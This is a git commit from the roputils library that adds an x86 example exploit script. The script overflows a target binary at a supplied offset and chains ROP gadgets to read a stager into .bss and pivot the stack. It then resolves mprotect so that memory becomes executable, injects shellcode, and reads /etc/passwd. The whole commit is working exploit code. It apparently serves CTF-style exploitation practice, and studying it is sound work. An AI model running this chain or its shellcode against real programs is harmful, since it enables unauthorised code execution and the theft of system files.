7abecf86fb445057df8782c03333a4bfc7ccf05a
inaz2 <inaz2@twitter>
2014-08-04 16:26:18 +0900

    improve Shellcode class and add examples/shellcode-*.py
     * fix cat shellcode
     * add read_stager shellcode
     * add xor encoder

---
+++ examples/shellcode-x86.py
@@ -0,0 +1,26 @@
+from roputils import *
+
+fpath = sys.argv[1]
+offset = int(sys.argv[2])
+
+rop = ROP(fpath)
+sc = Shellcode('i386')
+addr_stage = rop.section('.bss') + 0x800
+
+buf = rop.fill(offset)
+buf += rop.call_plt('read', 0, addr_stage, 100)
+buf += rop.pivot(addr_stage)
+
+p = Proc(rop.fpath)
+p.write(p32(len(buf)) + buf)
+print "[+] read: %r" % p.read(len(buf))
+
+buf = rop.dl_resolve(addr_stage, 'mprotect', addr_stage & ~0xFFF, 0x1000, 7, retaddr=addr_stage+61)
+print "[+] offset to shellcode: %d" % len(buf)
+buf += sc.get('read_stager')
+buf += rop.fill(100, buf)
+
+p.write(buf)
+p.write(sc.cat('/etc/passwd'))
+print p.read(8192)
+p.wait()
